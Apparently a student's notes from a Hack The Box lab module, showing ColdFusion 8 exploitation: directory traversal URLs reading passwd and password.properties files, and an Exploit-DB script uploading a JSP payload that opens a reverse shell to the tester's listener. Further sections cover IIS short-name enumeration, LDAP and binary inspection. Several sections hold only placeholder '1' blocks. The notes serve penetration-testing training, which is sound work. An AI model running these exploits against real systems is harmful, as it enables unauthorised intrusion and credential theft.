Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 350.38 seconds
```
The port scan results show three open ports. Two Windows RPC services, and one running on 8500. As we know, 8500 is a default port that ColdFusion uses for SSL. Navigating to the IP:8500 lists 2 directories, CFIDE and cfdocs, in the root, further indicating that ColdFusion is running on port 8500.

The /CFIDE/administrator path, however, loads the ColdFusion 8 Administrator login page. Now we know for certain that ColdFusion 8 is running on the server.

## Attacking ColdFusion

```
mdmithu@htb[/htb]$ searchsploit adobe coldfusion

------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
#### Directory Traversal

```
http://example.com/index.cfm?directory=../../../etc/&file=passwd
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```
```
mdmithu@htb[/htb]$ searchsploit -p 14641

  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable

Copied EDB-ID #14641's path to the clipboard
```
```
        shellsession
mdmithu@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
mdmithu@htb[/htb]$ python2 14641.py 

usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed
```
```
mdmithu@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...
```
```
mdmithu@htb[/htb]$ searchsploit -p 50057

  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied EDB-ID #50057's path to the clipboard
```
```
mdmithu@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```
```
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```
```
mdmithu@htb[/htb]$ python3 50057.py 

Generating a payload...
Payload size: 1497 bytes
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Priting request...
Content-type: multipart/form-data; boundary=77c732cb2f394ea79c71d42d50274368
Content-length: 1698

--77c732cb2f394ea79c71d42d50274368

<SNIP>

--77c732cb2f394ea79c71d42d50274368--


Sending request and printing response...


        <script type="text/javascript">
            window.parent.OnUploadCompleted( 0, "/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/1269fd7bd2b341fab6751ec31bbfb610.txt", "1269fd7bd2b341fab6751ec31bbfb610.txt", "0" );
        </script>
    

Printing some information for debugging...
lhost: 10.10.14.55
lport: 4444
rhost: 10.129.247.30
rport: 8500
payload: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```
```
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\ColdFusion8\runtime\bin

22/03/2017  08:53 ��    <DIR>          .
22/03/2017  08:53 ��    <DIR>          ..
18/03/2008  11:11 ��            64.512 java2wsdl.exe
19/01/2008  09:59 ��         2.629.632 jikes.exe
18/03/2008  11:11 ��            64.512 jrun.exe
18/03/2008  11:11 ��            71.680 jrunsvc.exe
18/03/2008  11:11 ��             5.120 jrunsvcmsg.dll
18/03/2008  11:11 ��            64.512 jspc.exe
22/03/2017  08:53 ��             1.804 jvm.config
18/03/2008  11:11 ��            64.512 migrate.exe
18/03/2008  11:11 ��            34.816 portscan.dll
18/03/2008  11:11 ��            64.512 sniffer.exe
18/03/2008  11:11 ��            78.848 WindowsLogin.dll
18/03/2008  11:11 ��            64.512 wsconfig.exe
22/03/2017  08:53 ��             1.013 wsconfig_jvm.config
18/03/2008  11:11 ��            64.512 wsdl2java.exe
18/03/2008  11:11 ��            64.512 xmlscript.exe
              15 File(s)      3.339.009 bytes
               2 Dir(s)   1.432.776.704 bytes free

```
## IIS Tilde Enumeration

```
mdmithu@htb[/htb]$ nmap -p- -sV -sC --open 10.129.224.91

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-14 19:44 GMT
Nmap scan report for 10.129.224.91
Host is up (0.011s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds
```
(IIS-ShortName-Scanner)['https://github.com/irsdl/IIS-ShortName-Scanner']
(install-jdk-18-ubuntu/)['https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/']
```
mdmithu@htb[/htb]$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP

```
```
mdmithu@htb[/htb]$ egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```
```
mdmithu@htb[/htb]$ gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tmp/list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/23 15:14:05 Starting gobuster in directory enumeration mode
===============================================================
/transf**.aspx        (Status: 200) [Size: 941]
Progress: 306 / 309 (99.03%)
===============================================================
2023/03/23 15:14:11 Finished
===============================================================

```
## LDAP
```
mdmithu@htb[/htb]$ ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
dn: uid=jdoe,ou=people,dc=example,dc=com
objectClass: inetOrgPerson
objectClass: organizationalPerson
objectClass: person
objectClass: top
cn: John Doe
sn: Doe
uid: jdoe
mail: john.doe@example.com

result: 0 Success

```
```
mdmithu@htb[/htb]$ nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 14:43 SAST
Nmap scan report for 10.129.204.229
Host is up (0.18s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.73 seconds
```
## Web Mass Assignment Vulnerabilities

```
1
```
## Attacking Applications Connecting to Services

```
mdmithu@htb[/htb]$ ./octopus_checker 

Program had started..
Attempting Connection 
Connecting ... 

The driver reported the following diagnostics whilst running SQLDriverConnect

01000:1:0:[unixODBC][Driver Manager]Can't open lib 'ODBC Driver 17 for SQL Server' : file not found
```
```
mdmithu@htb[/htb]$ gdb ./octopus_checker

GNU gdb (Debian 9.2-1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./octopus_checker...
(No debugging symbols found in ./octopus_checker)

```
#### DLL File Examination

```
C:\> Get-FileMetaData .\MultimasterAPI.dll

<SNIP>
M .NETFramework,Version=v4.6.1 TFrameworkDisplayName.NET Framework 4.6.1    api/getColleagues        ! htt
p://localhost:8081*POST         Ò^         øJ  ø,  RSDSœ»¡ÍuqœK£"Y¿bˆ   C:\Users\Hazard\Desktop\Stuff\Multimast
<SNIP>
```
## Other Notable Applications

```
1
```
```
1
```
```
1
```
```
1
```
```
1
```
```
1
```
```
1
```
```
1
```
```
1
```
```
1
```
```
1
```

